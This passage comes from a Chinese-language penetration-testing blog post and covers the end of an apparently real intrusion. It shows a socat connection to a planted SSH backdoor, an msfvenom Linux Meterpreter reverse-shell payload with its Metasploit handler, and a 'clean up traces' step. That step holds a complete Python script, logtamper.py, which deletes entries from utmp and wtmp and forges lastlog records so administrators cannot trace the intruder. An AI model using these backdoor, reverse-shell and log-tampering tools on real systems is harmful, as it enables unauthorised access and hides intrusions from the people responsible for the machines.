5.连接后门，记得安装好socat</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">sudo yum install socat
</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">#socat STDIO TCP4:目标ip:ssh端口一般是22,sourceport=31334
socat STDIO TCP4:127.0.0.1:22,sourceport=31334
</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/18.png" alt=""></p>
<h1 id="0x08-metaspliot-横向渗透">0x08 metaspliot 横向渗透</h1>
<p>当然做内网渗透必不可少的就是msf了，如果是Windows的话推荐使用<code>CobaltStrike</code>非常nice的一个工具。</p>
<p>反正我们现在拿到root的shell了，先反弹一个Meterpreter的会话，还是常规的生成payload，然后监听等待上线</p>
<ol>
<li>先生成一个后门</li>
</ol>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.79.132 LPORT=4455 -f elf &gt; shell.elf
</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/19.png" alt="">
2. 把shell.elf上传到目标机子上面运行
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/20.png" alt=""></p>
<ol start="3">
<li>在本地执行监听</li>
</ol>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4455
exploit
</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/21.png" alt=""></p>
<ol start="4">
<li>执行后门反弹Meterpreter的会话</li>
</ol>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">chmod +x ./shell.elf
./shell.elf
</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/22.png" alt="">
5.查看跳板机处于哪几个网段</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">run get_local_subnets
</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/23.png" alt=""></p>
<p>看了一下。。。</p>
<p>但是我这个是属于外网的机子，后来想了一下感觉都不是内网一点意思都没有。。。</p>
<p>算了吧下次有遇到内网的可以再写一篇内网渗透的文章出来哈</p>
<h1 id="0x09-擦屁股">0x09 擦屁股</h1>
<p>走之后记得清理痕迹，以防被溯源或者被管理员发现了。下面附上一个脚本供大家使用：</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python </span>
<span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">pwd</span> <span class="kn">import</span> <span class="n">getpwnam</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">strptime</span><span class="p">,</span> <span class="n">mktime</span>
<span class="kn">from</span> <span class="nn">optparse</span> <span class="kn">import</span> <span class="n">OptionParser</span>

<span class="n">UTMPFILE</span> <span class="o">=</span> <span class="s2">&#34;/var/run/utmp&#34;</span>
<span class="n">WTMPFILE</span> <span class="o">=</span> <span class="s2">&#34;/var/log/wtmp&#34;</span>
<span class="n">LASTLOGFILE</span> <span class="o">=</span> <span class="s2">&#34;/var/log/lastlog&#34;</span>

<span class="n">LAST_STRUCT</span> <span class="o">=</span> <span class="s1">&#39;I32s256s&#39;</span>
<span class="n">LAST_STRUCT_SIZE</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">calcsize</span><span class="p">(</span><span class="n">LAST_STRUCT</span><span class="p">)</span>

<span class="n">XTMP_STRUCT</span> <span class="o">=</span> <span class="s1">&#39;hi32s4s32s256shhiii4i20x&#39;</span>
<span class="n">XTMP_STRUCT_SIZE</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">calcsize</span><span class="p">(</span><span class="n">XTMP_STRUCT</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">getXtmp</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">hostname</span><span class="p">):</span>
    <span class="n">xtmp</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="nb">bytes</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">XTMP_STRUCT_SIZE</span><span class="p">)</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="nb">bytes</span><span class="p">:</span>
                <span class="k">break</span>

            <span class="n">data</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">XTMP_STRUCT</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">)</span>
            <span class="n">record</span> <span class="o">=</span> <span class="p">[(</span><span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">])(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">record</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="n">username</span> <span class="ow">and</span> <span class="n">record</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="n">hostname</span><span class="p">):</span>
                <span class="k">continue</span>
            <span class="n">xtmp</span> <span class="o">+=</span> <span class="nb">bytes</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;Cannot open file: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">filename</span><span class="p">)</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">xtmp</span>


<span class="k">def</span> <span class="nf">modifyLast</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">hostname</span><span class="p">,</span> <span class="n">ttyname</span><span class="p">,</span> <span class="n">strtime</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">getpwnam</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;No such user.&#39;</span><span class="p">)</span>

    <span class="n">timestamp</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">str2time</span> <span class="o">=</span> <span class="n">strptime</span><span class="p">(</span><span class="n">strtime</span><span class="p">,</span> <span class="s1">&#39;%Y:%m:</span><span class="si">%d</span><span class="s1">:%H:%M:%S&#39;</span><span class="p">)</span>
        <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">mktime</span><span class="p">(</span><span class="n">str2time</span><span class="p">))</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;Time format err.&#39;</span><span class="p">)</span>

    <span class="n">data</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="n">LAST_STRUCT</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="n">ttyname</span><span class="p">,</span> <span class="n">hostname</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span>
        <span class="n">fp</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">LAST_STRUCT_SIZE</span> <span class="o">*</span> <span class="n">p</span><span class="o">.</span><span class="n">pw_uid</span><span class="p">)</span>
        <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;Cannot open file: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">filename</span><span class="p">)</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="bp">True</span>


<span class="k">def</span> <span class="nf">showMessage</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
    <span class="k">print</span> <span class="n">msg</span>
    <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">saveFile</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">contents</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;w+b&#39;</span><span class="p">)</span>
        <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">contents</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">IOError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">showMessage</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">usage</span> <span class="o">=</span> <span class="s1">&#39;usage: logtamper.py -m 2 -u b4dboy -i 192.168.0.188</span><span class="se">\n</span><span class="s1"> </span><span class="se">\
</span><span class="se"></span><span class="s1">        logtamper.py -m 3 -u b4dboy -i 192.168.0.188 -t tty1 -d 2015:05:28:10:11:12&#39;</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">OptionParser</span><span class="p">(</span><span class="n">usage</span><span class="o">=</span><span class="n">usage</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-m&#39;</span><span class="p">,</span> <span class="s1">&#39;--mode&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;MODE&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;1&#39;</span> <span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;1: utmp, 2: wtmp, 3: lastlog [default: 1]&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-t&#39;</span><span class="p">,</span> <span class="s1">&#39;--ttyname&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;TTYNAME&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-f&#39;</span><span class="p">,</span> <span class="s1">&#39;--filename&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;FILENAME&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-u&#39;</span><span class="p">,</span> <span class="s1">&#39;--username&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;USERNAME&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-i&#39;</span><span class="p">,</span> <span class="s1">&#39;--hostname&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;HOSTNAME&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-d&#39;</span><span class="p">,</span> <span class="s1">&#39;--dateline&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;DATELINE&#39;</span><span class="p">)</span>
    <span class="p">(</span><span class="n">options</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>

    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">MODE</span> <span class="o">==</span> <span class="s1">&#39;1&#39;</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
                <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;+[Warning]: Incorrect parameter.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
                <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">=</span> <span class="n">UTMPFILE</span>

            <span class="c1"># tamper</span>
            <span class="n">newData</span> <span class="o">=</span> <span class="n">getXtmp</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span><span class="p">)</span>
            <span class="n">saveFile</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">newData</span><span class="p">)</span>

        <span class="k">elif</span> <span class="n">options</span><span class="o">.</span><span class="n">MODE</span> <span class="o">==</span> <span class="s1">&#39;2&#39;</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
                <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;+[Warning]: Incorrect parameter.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
                <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">=</span> <span class="n">WTMPFILE</span>

            <span class="c1"># tamper</span>
            <span class="n">newData</span> <span class="o">=</span> <span class="n">getXtmp</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span><span class="p">)</span>
            <span class="n">saveFile</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">newData</span><span class="p">)</span>

        <span class="k">elif</span> <span class="n">options</span><span class="o">.</span><span class="n">MODE</span> <span class="o">==</span> <span class="s1">&#39;3&#39;</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">TTYNAME</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">DATELINE</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
                <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;+[Warning]: Incorrect parameter.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
                <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">=</span> <span class="n">LASTLOGFILE</span>

            <span class="c1"># tamper</span>
            <span class="n">modifyLast</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">TTYNAME</span> <span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">DATELINE</span><span class="p">)</span>

        <span class="k">else</span><span class="p">:</span>
            <span class="n">parser</span><span class="o">.</span><span class="n">print_help</span><span class="p">()</span>
</code></pre></div><h1 id="0x10-结束">0x10 结束</h1>
<p>又2点了，抽支烟就该洗洗睡了，晚安~</p>

    </article>

    
    <div class="prevnext">
        



<ul class="prevnext">
    
    <li>上一篇：
        <a href="https://getshe11.com/post/an-app-distribution-system-upload-vulnerability/">
            某云分发APP上传漏洞
        </a>
    </li>
    
    
    <li>下一篇：
        <a href="https://getshe11.com/post/seacms-front-desk-getshell/">
            Seacms&lt;=9.92前台Getshell
        </a>
    </li>
    
</ul>

    </div>
    
    <div class="post-comments">
        
  
  

  
    <script src="https://utteranc.es/client.js"
            repo="F0r3at/Getshe11.com"
            issue-term="pathname"
            theme="github-light"
            crossorigin="anonymous"
            async>
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>

    </div>
</div>
            </div>
            
            <div class="col-second">
                <div class="col-box col-box-author">
    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
    <div class="col-box-title name">F0rmat</div>
    <p>Stay Hungry, Stay Foolish.</p>
    <p class="contact">
        <a href="http://github.com/F0r3at">Github</a>
    </p>
</div>

<div class="col-box">
    <div class="col-box-title">Newest Posts</div>
    <ul class="post-list">
        
        <li>
            <a href="https://getshe11.com/post/kali-install-clash/" class="post-link">Kali Linux安装Clash</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/a-difficult-penetration-process/" class="post-link">一次艰难的渗透提权过程</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/an-app-distribution-system-upload-vulnerability/" class="post-link">某云分发APP上传漏洞</a>
        </li>
        
    </ul>
</div>

<div class="col-box post-toc hide">
    <div class="col-box-title">TOC</div>
</div>
            </div>
        </div>
    </div>
    
    <footer class="footer">
        <div class="wrapper">
    © 2021    <a href="https://getshe11.com">F0rmat</a>
</div>
    </footer>
    
    
<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>

<script src="/js/easybook.js"></script>

<script src="/js/lazysizes.min.js"></script>

<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
<script src="/js/figure.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-XXXXXXXX-X', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>






</body>

</html>